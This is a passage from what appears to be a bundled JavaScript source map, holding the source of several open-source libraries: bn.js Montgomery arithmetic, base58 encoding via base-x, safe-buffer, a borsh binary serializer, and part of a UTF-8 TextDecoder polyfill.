};\n\n  Red.prototype.pow = function pow (a, num) {\n    if (num.isZero()) return new BN(1).toRed(this);\n    if (num.cmpn(1) === 0) return a.clone();\n\n    var windowSize = 4;\n    var wnd = new Array(1 << windowSize);\n    wnd[0] = new BN(1).toRed(this);\n    wnd[1] = a;\n    for (var i = 2; i < wnd.length; i++) {\n      wnd[i] = this.mul(wnd[i - 1], a);\n    }\n\n    var res = wnd[0];\n    var current = 0;\n    var currentLen = 0;\n    var start = num.bitLength() % 26;\n    if (start === 0) {\n      start = 26;\n    }\n\n    for (i = num.length - 1; i >= 0; i--) {\n      var word = num.words[i];\n      for (var j = start - 1; j >= 0; j--) {\n        var bit = (word >> j) & 1;\n        if (res !== wnd[0]) {\n          res = this.sqr(res);\n        }\n\n        if (bit === 0 && current === 0) {\n          currentLen = 0;\n          continue;\n        }\n\n        current <<= 1;\n        current |= bit;\n        currentLen++;\n        if (currentLen !== windowSize && (i !== 0 || j !== 0)) continue;\n\n        res = this.mul(res, wnd[current]);\n        currentLen = 0;\n        current = 0;\n      }\n      start = 26;\n    }\n\n    return res;\n  };\n\n  Red.prototype.convertTo = function convertTo (num) {\n    var r = num.umod(this.m);\n\n    return r === num ? r.clone() : r;\n  };\n\n  Red.prototype.convertFrom = function convertFrom (num) {\n    var res = num.clone();\n    res.red = null;\n    return res;\n  };\n\n  //\n  // Montgomery method engine\n  //\n\n  BN.mont = function mont (num) {\n    return new Mont(num);\n  };\n\n  function Mont (m) {\n    Red.call(this, m);\n\n    this.shift = this.m.bitLength();\n    if (this.shift % 26 !== 0) {\n      this.shift += 26 - (this.shift % 26);\n    }\n\n    this.r = new BN(1).iushln(this.shift);\n    this.r2 = this.imod(this.r.sqr());\n    this.rinv = this.r._invmp(this.m);\n\n    this.minv = this.rinv.mul(this.r).isubn(1).div(this.m);\n    this.minv = this.minv.umod(this.r);\n    this.minv = this.r.sub(this.minv);\n  }\n  inherits(Mont, Red);\n\n  Mont.prototype.convertTo = function convertTo (num) {\n    return this.imod(num.ushln(this.shift));\n  };\n\n  Mont.prototype.convertFrom = function convertFrom (num) {\n    var r = this.imod(num.mul(this.rinv));\n    r.red = null;\n    return r;\n  };\n\n  Mont.prototype.imul = function imul (a, b) {\n    if (a.isZero() || b.isZero()) {\n      a.words[0] = 0;\n      a.length = 1;\n      return a;\n    }\n\n    var t = a.imul(b);\n    var c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m);\n    var u = t.isub(c).iushrn(this.shift);\n    var res = u;\n\n    if (u.cmp(this.m) >= 0) {\n      res = u.isub(this.m);\n    } else if (u.cmpn(0) < 0) {\n      res = u.iadd(this.m);\n    }\n\n    return res._forceRed(this);\n  };\n\n  Mont.prototype.mul = function mul (a, b) {\n    if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);\n\n    var t = a.mul(b);\n    var c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m);\n    var u = t.isub(c).iushrn(this.shift);\n    var res = u;\n    if (u.cmp(this.m) >= 0) {\n      res = u.isub(this.m);\n    } else if (u.cmpn(0) < 0) {\n      res = u.iadd(this.m);\n    }\n\n    return res._forceRed(this);\n  };\n\n  Mont.prototype.invm = function invm (a) {\n    // (AR)^-1 * R^2 = (A^-1 * R^-1) * R^2 = A^-1 * R\n    var res = this.imod(a._invmp(this.m).mul(this.r2));\n    return res._forceRed(this);\n  };\n})(typeof module === 'undefined' || module, this);\n","\"use strict\";","var basex = require('base-x')\nvar ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'\n\nmodule.exports = basex(ALPHABET)\n","'use strict'\n// base-x encoding / decoding\n// Copyright (c) 2018 base-x contributors\n// Copyright (c) 2014-2018 The Bitcoin Core developers (base58.cpp)\n// Distributed under the MIT software license, see the accompanying\n// file LICENSE or http://www.opensource.org/licenses/mit-license.php.\n// @ts-ignore\nvar _Buffer = require('safe-buffer').Buffer\nfunction base (ALPHABET) {\n  if (ALPHABET.length >= 255) { throw new TypeError('Alphabet too long') }\n  var BASE_MAP = new Uint8Array(256)\n  for (var j = 0; j < BASE_MAP.length; j++) {\n    BASE_MAP[j] = 255\n  }\n  for (var i = 0; i < ALPHABET.length; i++) {\n    var x = ALPHABET.charAt(i)\n    var xc = x.charCodeAt(0)\n    if (BASE_MAP[xc] !== 255) { throw new TypeError(x + ' is ambiguous') }\n    BASE_MAP[xc] = i\n  }\n  var BASE = ALPHABET.length\n  var LEADER = ALPHABET.charAt(0)\n  var FACTOR = Math.log(BASE) / Math.log(256) // log(BASE) / log(256), rounded up\n  var iFACTOR = Math.log(256) / Math.log(BASE) // log(256) / log(BASE), rounded up\n  function encode (source) {\n    if (Array.isArray(source) || source instanceof Uint8Array) { source = _Buffer.from(source) }\n    if (!_Buffer.isBuffer(source)) { throw new TypeError('Expected Buffer') }\n    if (source.length === 0) { return '' }\n        // Skip & count leading zeroes.\n    var zeroes = 0\n    var length = 0\n    var pbegin = 0\n    var pend = source.length\n    while (pbegin !== pend && source[pbegin] === 0) {\n      pbegin++\n      zeroes++\n    }\n        // Allocate enough space in big-endian base58 representation.\n    var size = ((pend - pbegin) * iFACTOR + 1) >>> 0\n    var b58 = new Uint8Array(size)\n        // Process the bytes.\n    while (pbegin !== pend) {\n      var carry = source[pbegin]\n            // Apply \"b58 = b58 * 256 + ch\".\n      var i = 0\n      for (var it1 = size - 1; (carry !== 0 || i < length) && (it1 !== -1); it1--, i++) {\n        carry += (256 * b58[it1]) >>> 0\n        b58[it1] = (carry % BASE) >>> 0\n        carry = (carry / BASE) >>> 0\n      }\n      if (carry !== 0) { throw new Error('Non-zero carry') }\n      length = i\n      pbegin++\n    }\n        // Skip leading zeroes in base58 result.\n    var it2 = size - length\n    while (it2 !== size && b58[it2] === 0) {\n      it2++\n    }\n        // Translate the result into a string.\n    var str = LEADER.repeat(zeroes)\n    for (; it2 < size; ++it2) { str += ALPHABET.charAt(b58[it2]) }\n    return str\n  }\n  function decodeUnsafe (source) {\n    if (typeof source !== 'string') { throw new TypeError('Expected String') }\n    if (source.length === 0) { return _Buffer.alloc(0) }\n    var psz = 0\n        // Skip and count leading '1's.\n    var zeroes = 0\n    var length = 0\n    while (source[psz] === LEADER) {\n      zeroes++\n      psz++\n    }\n        // Allocate enough space in big-endian base256 representation.\n    var size = (((source.length - psz) * FACTOR) + 1) >>> 0 // log(58) / log(256), rounded up.\n    var b256 = new Uint8Array(size)\n        // Process the characters.\n    while (psz < source.length) {\n            // Decode character\n      var carry = BASE_MAP[source.charCodeAt(psz)]\n            // Invalid character\n      if (carry === 255) { return }\n      var i = 0\n      for (var it3 = size - 1; (carry !== 0 || i < length) && (it3 !== -1); it3--, i++) {\n        carry += (BASE * b256[it3]) >>> 0\n        b256[it3] = (carry % 256) >>> 0\n        carry = (carry / 256) >>> 0\n      }\n      if (carry !== 0) { throw new Error('Non-zero carry') }\n      length = i\n      psz++\n    }\n        // Skip leading zeroes in b256.\n    var it4 = size - length\n    while (it4 !== size && b256[it4] === 0) {\n      it4++\n    }\n    var vch = _Buffer.allocUnsafe(zeroes + (size - it4))\n    vch.fill(0x00, 0, zeroes)\n    var j = zeroes\n    while (it4 !== size) {\n      vch[j++] = b256[it4++]\n    }\n    return vch\n  }\n  function decode (string) {\n    var buffer = decodeUnsafe(string)\n    if (buffer) { return buffer }\n    throw new Error('Non-base' + BASE + ' character')\n  }\n  return {\n    encode: encode,\n    decodeUnsafe: decodeUnsafe,\n    decode: decode\n  }\n}\nmodule.exports = base\n","/*! safe-buffer. MIT License. Feross Aboukhadijeh <https://feross.org/opensource> */\n/* eslint-disable node/no-deprecated-api */\nvar buffer = require('buffer')\nvar Buffer = buffer.Buffer\n\n// alternative to using Object.keys for old browsers\nfunction copyProps (src, dst) {\n  for (var key in src) {\n    dst[key] = src[key]\n  }\n}\nif (Buffer.from && Buffer.alloc && Buffer.allocUnsafe && Buffer.allocUnsafeSlow) {\n  module.exports = buffer\n} else {\n  // Copy properties from require('buffer')\n  copyProps(buffer, exports)\n  exports.Buffer = SafeBuffer\n}\n\nfunction SafeBuffer (arg, encodingOrOffset, length) {\n  return Buffer(arg, encodingOrOffset, length)\n}\n\nSafeBuffer.prototype = Object.create(Buffer.prototype)\n\n// Copy static methods from Buffer\ncopyProps(Buffer, SafeBuffer)\n\nSafeBuffer.from = function (arg, encodingOrOffset, length) {\n  if (typeof arg === 'number') {\n    throw new TypeError('Argument must not be a number')\n  }\n  return Buffer(arg, encodingOrOffset, length)\n}\n\nSafeBuffer.alloc = function (size, fill, encoding) {\n  if (typeof size !== 'number') {\n    throw new TypeError('Argument must be a number')\n  }\n  var buf = Buffer(size)\n  if (fill !== undefined) {\n    if (typeof encoding === 'string') {\n      buf.fill(fill, encoding)\n    } else {\n      buf.fill(fill)\n    }\n  } else {\n    buf.fill(0)\n  }\n  return buf\n}\n\nSafeBuffer.allocUnsafe = function (size) {\n  if (typeof size !== 'number') {\n    throw new TypeError('Argument must be a number')\n  }\n  return Buffer(size)\n}\n\nSafeBuffer.allocUnsafeSlow = function (size) {\n  if (typeof size !== 'number') {\n    throw new TypeError('Argument must be a number')\n  }\n  return buffer.SlowBuffer(size)\n}\n",null,null,null,null,null,null,null,null,null,null,"\"use strict\";\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {\n    Object.defineProperty(o, \"default\", { enumerable: true, value: v });\n}) : function(o, v) {\n    o[\"default\"] = v;\n});\nvar __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {\n    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;\n    if (typeof Reflect === \"object\" && typeof Reflect.decorate === \"function\") r = Reflect.decorate(decorators, target, key, desc);\n    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;\n    return c > 3 && r && Object.defineProperty(target, key, r), r;\n};\nvar __importStar = (this && this.__importStar) || function (mod) {\n    if (mod && mod.__esModule) return mod;\n    var result = {};\n    if (mod != null) for (var k in mod) if (k !== \"default\" && Object.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);\n    __setModuleDefault(result, mod);\n    return result;\n};\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n    return (mod && mod.__esModule) ? mod : { \"default\": mod };\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.deserializeUnchecked = exports.deserialize = exports.serialize = exports.BinaryReader = exports.BinaryWriter = exports.BorshError = exports.baseDecode = exports.baseEncode = void 0;\nconst bn_js_1 = __importDefault(require(\"bn.js\"));\nconst bs58_1 = __importDefault(require(\"bs58\"));\n// TODO: Make sure this polyfill not included when not required\nconst encoding = __importStar(require(\"text-encoding-utf-8\"));\nconst ResolvedTextDecoder = typeof TextDecoder !== \"function\" ? encoding.TextDecoder : TextDecoder;\nconst textDecoder = new ResolvedTextDecoder(\"utf-8\", { fatal: true });\nfunction baseEncode(value) {\n    if (typeof value === \"string\") {\n        value = Buffer.from(value, \"utf8\");\n    }\n    return bs58_1.default.encode(Buffer.from(value));\n}\nexports.baseEncode = baseEncode;\nfunction baseDecode(value) {\n    return Buffer.from(bs58_1.default.decode(value));\n}\nexports.baseDecode = baseDecode;\nconst INITIAL_LENGTH = 1024;\nclass BorshError extends Error {\n    constructor(message) {\n        super(message);\n        this.fieldPath = [];\n        this.originalMessage = message;\n    }\n    addToFieldPath(fieldName) {\n        this.fieldPath.splice(0, 0, fieldName);\n        // NOTE: Modifying message directly as jest doesn't use .toString()\n        this.message = this.originalMessage + \": \" + this.fieldPath.join(\".\");\n    }\n}\nexports.BorshError = BorshError;\n/// Binary encoder.\nclass BinaryWriter {\n    constructor() {\n        this.buf = Buffer.alloc(INITIAL_LENGTH);\n        this.length = 0;\n    }\n    maybeResize() {\n        if (this.buf.length < 16 + this.length) {\n            this.buf = Buffer.concat([this.buf, Buffer.alloc(INITIAL_LENGTH)]);\n        }\n    }\n    writeU8(value) {\n        this.maybeResize();\n        this.buf.writeUInt8(value, this.length);\n        this.length += 1;\n    }\n    writeU16(value) {\n        this.maybeResize();\n        this.buf.writeUInt16LE(value, this.length);\n        this.length += 2;\n    }\n    writeU32(value) {\n        this.maybeResize();\n        this.buf.writeUInt32LE(value, this.length);\n        this.length += 4;\n    }\n    writeU64(value) {\n        this.maybeResize();\n        this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray(\"le\", 8)));\n    }\n    writeU128(value) {\n        this.maybeResize();\n        this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray(\"le\", 16)));\n    }\n    writeU256(value) {\n        this.maybeResize();\n        this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray(\"le\", 32)));\n    }\n    writeU512(value) {\n        this.maybeResize();\n        this.writeBuffer(Buffer.from(new bn_js_1.default(value).toArray(\"le\", 64)));\n    }\n    writeBuffer(buffer) {\n        // Buffer.from is needed as this.buf.subarray can return plain Uint8Array in browser\n        this.buf = Buffer.concat([\n            Buffer.from(this.buf.subarray(0, this.length)),\n            buffer,\n            Buffer.alloc(INITIAL_LENGTH),\n        ]);\n        this.length += buffer.length;\n    }\n    writeString(str) {\n        this.maybeResize();\n        const b = Buffer.from(str, \"utf8\");\n        this.writeU32(b.length);\n        this.writeBuffer(b);\n    }\n    writeFixedArray(array) {\n        this.writeBuffer(Buffer.from(array));\n    }\n    writeArray(array, fn) {\n        this.maybeResize();\n        this.writeU32(array.length);\n        for (const elem of array) {\n            this.maybeResize();\n            fn(elem);\n        }\n    }\n    toArray() {\n        return this.buf.subarray(0, this.length);\n    }\n}\nexports.BinaryWriter = BinaryWriter;\nfunction handlingRangeError(target, propertyKey, propertyDescriptor) {\n    const originalMethod = propertyDescriptor.value;\n    propertyDescriptor.value = function (...args) {\n        try {\n            return originalMethod.apply(this, args);\n        }\n        catch (e) {\n            if (e instanceof RangeError) {\n                const code = e.code;\n                if ([\"ERR_BUFFER_OUT_OF_BOUNDS\", \"ERR_OUT_OF_RANGE\"].indexOf(code) >= 0) {\n                    throw new BorshError(\"Reached the end of buffer when deserializing\");\n                }\n            }\n            throw e;\n        }\n    };\n}\nclass BinaryReader {\n    constructor(buf) {\n        this.buf = buf;\n        this.offset = 0;\n    }\n    readU8() {\n        const value = this.buf.readUInt8(this.offset);\n        this.offset += 1;\n        return value;\n    }\n    readU16() {\n        const value = this.buf.readUInt16LE(this.offset);\n        this.offset += 2;\n        return value;\n    }\n    readU32() {\n        const value = this.buf.readUInt32LE(this.offset);\n        this.offset += 4;\n        return value;\n    }\n    readU64() {\n        const buf = this.readBuffer(8);\n        return new bn_js_1.default(buf, \"le\");\n    }\n    readU128() {\n        const buf = this.readBuffer(16);\n        return new bn_js_1.default(buf, \"le\");\n    }\n    readU256() {\n        const buf = this.readBuffer(32);\n        return new bn_js_1.default(buf, \"le\");\n    }\n    readU512() {\n        const buf = this.readBuffer(64);\n        return new bn_js_1.default(buf, \"le\");\n    }\n    readBuffer(len) {\n        if (this.offset + len > this.buf.length) {\n            throw new BorshError(`Expected buffer length ${len} isn't within bounds`);\n        }\n        const result = this.buf.slice(this.offset, this.offset + len);\n        this.offset += len;\n        return result;\n    }\n    readString() {\n        const len = this.readU32();\n        const buf = this.readBuffer(len);\n        try {\n            // NOTE: Using TextDecoder to fail on invalid UTF-8\n            return textDecoder.decode(buf);\n        }\n        catch (e) {\n            throw new BorshError(`Error decoding UTF-8 string: ${e}`);\n        }\n    }\n    readFixedArray(len) {\n        return new Uint8Array(this.readBuffer(len));\n    }\n    readArray(fn) {\n        const len = this.readU32();\n        const result = Array();\n        for (let i = 0; i < len; ++i) {\n            result.push(fn());\n        }\n        return result;\n    }\n}\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU8\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU16\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU32\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU64\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU128\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU256\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readU512\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readString\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readFixedArray\", null);\n__decorate([\n    handlingRangeError\n], BinaryReader.prototype, \"readArray\", null);\nexports.BinaryReader = BinaryReader;\nfunction capitalizeFirstLetter(string) {\n    return string.charAt(0).toUpperCase() + string.slice(1);\n}\nfunction serializeField(schema, fieldName, value, fieldType, writer) {\n    try {\n        // TODO: Handle missing values properly (make sure they never result in just skipped write)\n        if (typeof fieldType === \"string\") {\n            writer[`write${capitalizeFirstLetter(fieldType)}`](value);\n        }\n        else if (fieldType instanceof Array) {\n            if (typeof fieldType[0] === \"number\") {\n                if (value.length !== fieldType[0]) {\n                    throw new BorshError(`Expecting byte array of length ${fieldType[0]}, but got ${value.length} bytes`);\n                }\n                writer.writeFixedArray(value);\n            }\n            else if (fieldType.length === 2 && typeof fieldType[1] === \"number\") {\n                if (value.length !== fieldType[1]) {\n                    throw new BorshError(`Expecting byte array of length ${fieldType[1]}, but got ${value.length} bytes`);\n                }\n                for (let i = 0; i < fieldType[1]; i++) {\n                    serializeField(schema, null, value[i], fieldType[0], writer);\n                }\n            }\n            else {\n                writer.writeArray(value, (item) => {\n                    serializeField(schema, fieldName, item, fieldType[0], writer);\n                });\n            }\n        }\n        else if (fieldType.kind !== undefined) {\n            switch (fieldType.kind) {\n                case \"option\": {\n                    if (value === null || value === undefined) {\n                        writer.writeU8(0);\n                    }\n                    else {\n                        writer.writeU8(1);\n                        serializeField(schema, fieldName, value, fieldType.type, writer);\n                    }\n                    break;\n                }\n                case \"map\": {\n                    writer.writeU32(value.size);\n                    value.forEach((val, key) => {\n                        serializeField(schema, fieldName, key, fieldType.key, writer);\n                        serializeField(schema, fieldName, val, fieldType.value, writer);\n                    });\n                    break;\n                }\n                default:\n                    throw new BorshError(`FieldType ${fieldType} unrecognized`);\n            }\n        }\n        else {\n            serializeStruct(schema, value, writer);\n        }\n    }\n    catch (error) {\n        if (error instanceof BorshError) {\n            error.addToFieldPath(fieldName);\n        }\n        throw error;\n    }\n}\nfunction serializeStruct(schema, obj, writer) {\n    if (typeof obj.borshSerialize === \"function\") {\n        obj.borshSerialize(writer);\n        return;\n    }\n    const structSchema = schema.get(obj.constructor);\n    if (!structSchema) {\n        throw new BorshError(`Class ${obj.constructor.name} is missing in schema`);\n    }\n    if (structSchema.kind === \"struct\") {\n        structSchema.fields.map(([fieldName, fieldType]) => {\n            serializeField(schema, fieldName, obj[fieldName], fieldType, writer);\n        });\n    }\n    else if (structSchema.kind === \"enum\") {\n        const name = obj[structSchema.field];\n        for (let idx = 0; idx < structSchema.values.length; ++idx) {\n            const [fieldName, fieldType] = structSchema.values[idx];\n            if (fieldName === name) {\n                writer.writeU8(idx);\n                serializeField(schema, fieldName, obj[fieldName], fieldType, writer);\n                break;\n            }\n        }\n    }\n    else {\n        throw new BorshError(`Unexpected schema kind: ${structSchema.kind} for ${obj.constructor.name}`);\n    }\n}\n/// Serialize given object using schema of the form:\n/// { class_name -> [ [field_name, field_type], .. ], .. }\nfunction serialize(schema, obj, Writer = BinaryWriter) {\n    const writer = new Writer();\n    serializeStruct(schema, obj, writer);\n    return writer.toArray();\n}\nexports.serialize = serialize;\nfunction deserializeField(schema, fieldName, fieldType, reader) {\n    try {\n        if (typeof fieldType === \"string\") {\n            return reader[`read${capitalizeFirstLetter(fieldType)}`]();\n        }\n        if (fieldType instanceof Array) {\n            if (typeof fieldType[0] === \"number\") {\n                return reader.readFixedArray(fieldType[0]);\n            }\n            else if (typeof fieldType[1] === \"number\") {\n                const arr = [];\n                for (let i = 0; i < fieldType[1]; i++) {\n                    arr.push(deserializeField(schema, null, fieldType[0], reader));\n                }\n                return arr;\n            }\n            else {\n                return reader.readArray(() => deserializeField(schema, fieldName, fieldType[0], reader));\n            }\n        }\n        if (fieldType.kind === \"option\") {\n            const option = reader.readU8();\n            if (option) {\n                return deserializeField(schema, fieldName, fieldType.type, reader);\n            }\n            return undefined;\n        }\n        if (fieldType.kind === \"map\") {\n            let map = new Map();\n            const length = reader.readU32();\n            for (let i = 0; i < length; i++) {\n                const key = deserializeField(schema, fieldName, fieldType.key, reader);\n                const val = deserializeField(schema, fieldName, fieldType.value, reader);\n                map.set(key, val);\n            }\n            return map;\n        }\n        return deserializeStruct(schema, fieldType, reader);\n    }\n    catch (error) {\n        if (error instanceof BorshError) {\n            error.addToFieldPath(fieldName);\n        }\n        throw error;\n    }\n}\nfunction deserializeStruct(schema, classType, reader) {\n    if (typeof classType.borshDeserialize === \"function\") {\n        return classType.borshDeserialize(reader);\n    }\n    const structSchema = schema.get(classType);\n    if (!structSchema) {\n        throw new BorshError(`Class ${classType.name} is missing in schema`);\n    }\n    if (structSchema.kind === \"struct\") {\n        const result = {};\n        for (const [fieldName, fieldType] of schema.get(classType).fields) {\n            result[fieldName] = deserializeField(schema, fieldName, fieldType, reader);\n        }\n        return new classType(result);\n    }\n    if (structSchema.kind === \"enum\") {\n        const idx = reader.readU8();\n        if (idx >= structSchema.values.length) {\n            throw new BorshError(`Enum index: ${idx} is out of range`);\n        }\n        const [fieldName, fieldType] = structSchema.values[idx];\n        const fieldValue = deserializeField(schema, fieldName, fieldType, reader);\n        return new classType({ [fieldName]: fieldValue });\n    }\n    throw new BorshError(`Unexpected schema kind: ${structSchema.kind} for ${classType.constructor.name}`);\n}\n/// Deserializes object from bytes using schema.\nfunction deserialize(schema, classType, buffer, Reader = BinaryReader) {\n    const reader = new Reader(buffer);\n    const result = deserializeStruct(schema, classType, reader);\n    if (reader.offset < buffer.length) {\n        throw new BorshError(`Unexpected ${buffer.length - reader.offset} bytes after deserialized data`);\n    }\n    return result;\n}\nexports.deserialize = deserialize;\n/// Deserializes object from bytes using schema, without checking the length read\nfunction deserializeUnchecked(schema, classType, buffer, Reader = BinaryReader) {\n    const reader = new Reader(buffer);\n    return deserializeStruct(schema, classType, reader);\n}\nexports.deserializeUnchecked = deserializeUnchecked;\n","'use strict';\n\n// This is free and unencumbered software released into the public domain.\n// See LICENSE.md for more information.\n\n//\n// Utilities\n//\n\n/**\n * @param {number} a The number to test.\n * @param {number} min The minimum value in the range, inclusive.\n * @param {number} max The maximum value in the range, inclusive.\n * @return {boolean} True if a >= min and a <= max.\n */\nfunction inRange(a, min, max) {\n  return min <= a && a <= max;\n}\n\n/**\n * @param {*} o\n * @return {Object}\n */\nfunction ToDictionary(o) {\n  if (o === undefined) return {};\n  if (o === Object(o)) return o;\n  throw TypeError('Could not convert argument to dictionary');\n}\n\n/**\n * @param {string} string Input string of UTF-16 code units.\n * @return {!Array.<number>} Code points.\n */\nfunction stringToCodePoints(string) {\n  // https://heycam.github.io/webidl/#dfn-obtain-unicode\n\n  // 1. Let S be the DOMString value.\n  var s = String(string);\n\n  // 2. Let n be the length of S.\n  var n = s.length;\n\n  // 3. Initialize i to 0.\n  var i = 0;\n\n  // 4. Initialize U to be an empty sequence of Unicode characters.\n  var u = [];\n\n  // 5. While i < n:\n  while (i < n) {\n\n    // 1. Let c be the code unit in S at index i.\n    var c = s.charCodeAt(i);\n\n    // 2. Depending on the value of c:\n\n    // c < 0xD800 or c > 0xDFFF\n    if (c < 0xD800 || c > 0xDFFF) {\n      // Append to U the Unicode character with code point c.\n      u.push(c);\n    }\n\n    // 0xDC00 ≤ c ≤ 0xDFFF\n    else if (0xDC00 <= c && c <= 0xDFFF) {\n      // Append to U a U+FFFD REPLACEMENT CHARACTER.\n      u.push(0xFFFD);\n    }\n\n    // 0xD800 ≤ c ≤ 0xDBFF\n    else if (0xD800 <= c && c <= 0xDBFF) {\n      // 1. If i = n−1, then append to U a U+FFFD REPLACEMENT\n      // CHARACTER.\n      if (i === n - 1) {\n        u.push(0xFFFD);\n      }\n      // 2. Otherwise, i < n−1:\n      else {\n        // 1. Let d be the code unit in S at index i+1.\n        var d = string.charCodeAt(i + 1);\n\n        // 2. If 0xDC00 ≤ d ≤ 0xDFFF, then:\n        if (0xDC00 <= d && d <= 0xDFFF) {\n          // 1. Let a be c & 0x3FF.\n          var a = c & 0x3FF;\n\n          // 2. Let b be d & 0x3FF.\n          var b = d & 0x3FF;\n\n          // 3. Append to U the Unicode character with code point\n          // 2^16+2^10*a+b.\n          u.push(0x10000 + (a << 10) + b);\n\n          // 4. Set i to i+1.\n          i += 1;\n        }\n\n        // 3. Otherwise, d < 0xDC00 or d > 0xDFFF. Append to U a\n        // U+FFFD REPLACEMENT CHARACTER.\n        else  {\n          u.push(0xFFFD);\n        }\n      }\n    }\n\n    // 3. Set i to i+1.\n    i += 1;\n  }\n\n  // 6. Return U.\n  return u;\n}\n\n/**\n * @param {!Array.<number>} code_points Array of code points.\n * @return {string} string String of UTF-16 code units.\n */\nfunction codePointsToString(code_points) {\n  var s = '';\n  for (var i = 0; i < code_points.length; ++i) {\n    var cp = code_points[i];\n    if (cp <= 0xFFFF) {\n      s += String.fromCharCode(cp);\n    } else {\n      cp -= 0x10000;\n      s += String.fromCharCode((cp >> 10) + 0xD800,\n                               (cp & 0x3FF) + 0xDC00);\n    }\n  }\n  return s;\n}\n\n\n//\n// Implementation of Encoding specification\n// https://encoding.spec.whatwg.org/\n//\n\n//\n// 3. Terminology\n//\n\n/**\n * End-of-stream is a special token that signifies no more tokens\n * are in the stream.\n * @const\n */ var end_of_stream = -1;\n\n/**\n * A stream represents an ordered sequence of tokens.\n *\n * @constructor\n * @param {!(Array.<number>|Uint8Array)} tokens Array of tokens that provide the\n * stream.\n */\nfunction Stream(tokens) {\n  /** @type {!Array.<number>} */\n  this.tokens = [].slice.call(tokens);\n}\n\nStream.prototype = {\n  /**\n   * @return {boolean} True if end-of-stream has been hit.\n   */\n  endOfStream: function() {\n    return !this.tokens.length;\n  },\n\n  /**\n   * When a token is read from a stream, the first token in the\n   * stream must be returned and subsequently removed, and\n   * end-of-stream must be returned otherwise.\n   *\n   * @return {number} Get the next token from the stream, or\n   * end_of_stream.\n   */\n   read: function() {\n    if (!this.tokens.length)\n      return end_of_stream;\n     return this.tokens.shift();\n   },\n\n  /**\n   * When one or more tokens are prepended to a stream, those tokens\n   * must be inserted, in given order, before the first token in the\n   * stream.\n   *\n   * @param {(number|!Array.<number>)} token The token(s) to prepend to the stream.\n   */\n  prepend: function(token) {\n    if (Array.isArray(token)) {\n      var tokens = /**@type {!Array.<number>}*/(token);\n      while (tokens.length)\n        this.tokens.unshift(tokens.pop());\n    } else {\n      this.tokens.unshift(token);\n    }\n  },\n\n  /**\n   * When one or more tokens are pushed to a stream, those tokens\n   * must be inserted, in given order, after the last token in the\n   * stream.\n   *\n   * @param {(number|!Array.<number>)} token The tokens(s) to prepend to the stream.\n   */\n  push: function(token) {\n    if (Array.isArray(token)) {\n      var tokens = /**@type {!Array.<number>}*/(token);\n      while (tokens.length)\n        this.tokens.push(tokens.shift());\n    } else {\n      this.tokens.push(token);\n    }\n  }\n};\n\n//\n// 4. Encodings\n//\n\n// 4.1 Encoders and decoders\n\n/** @const */\nvar finished = -1;\n\n/**\n * @param {boolean} fatal If true, decoding errors raise an exception.\n * @param {number=} opt_code_point Override the standard fallback code point.\n * @return {number} The code point to insert on a decoding error.\n */\nfunction decoderError(fatal, opt_code_point) {\n  if (fatal)\n    throw TypeError('Decoder error');\n  return opt_code_point || 0xFFFD;\n}\n\n//\n// 7. API\n//\n\n/** @const */ var DEFAULT_ENCODING = 'utf-8';\n\n// 7.1 Interface TextDecoder\n\n/**\n * @constructor\n * @param {string=} encoding The label of the encoding;\n *     defaults to 'utf-8'.\n * @param {Object=} options\n */\nfunction TextDecoder(encoding, options) {\n  if (!(this instanceof TextDecoder)) {\n    return new TextDecoder(encoding, options);\n  }\n  encoding = encoding !== undefined ? String(encoding).toLowerCase() : DEFAULT_ENCODING;\n  if (encoding !== DEFAULT_ENCODING) {\n    throw new Error('Encoding not supported. Only utf-8 is supported');\n  }\n  options = ToDictionary(options);\n\n  /** @private @type {boolean} */\n  this._streaming = false;\n  /** @private @type {boolean} */\n  this._BOMseen = false;\n  /** @private @type {?Decoder} */\n  this._decoder = null;\n  /** @private @type {boolean} */\n  this._fatal = Boolean(options['fatal']);\n  /** @private @type {boolean} */\n  this._ignoreBOM = Boolean(options['ignoreBOM']);\n\n  Object.defineProperty(this, 'encoding', {value: 'utf-8'});\n  Object.defineProperty(this, 'fatal', {value: this._fatal});\n  Object.defineProperty(this, 'ignoreBOM', {value: this._ignoreBOM});\n}\n\nTextDecoder.prototype = {\n  /**\n   * @param {ArrayBufferView=} input The buffer of bytes to decode.\n   * @param {Object=} options\n   * @return {string} The decoded string.\n   */\n  decode: function decode(input, options) {\n    var bytes;\n    if (typeof input === 'object' && input instanceof ArrayBuffer) {\n      bytes = new Uint8Array(input);\n    } else if (typeof input === 'object' && 'buffer' in input &&\n               input.buffer instanceof ArrayBuffer) {\n      bytes = new Uint8Array(input.buffer,\n                             input.byteOffset,\n                             input.byteLength);\n    } else {\n      bytes = new Uint8Array(0);\n    }\n\n    options = ToDictionary(options);\n\n    if (!this._streaming) {\n      this._decoder = new 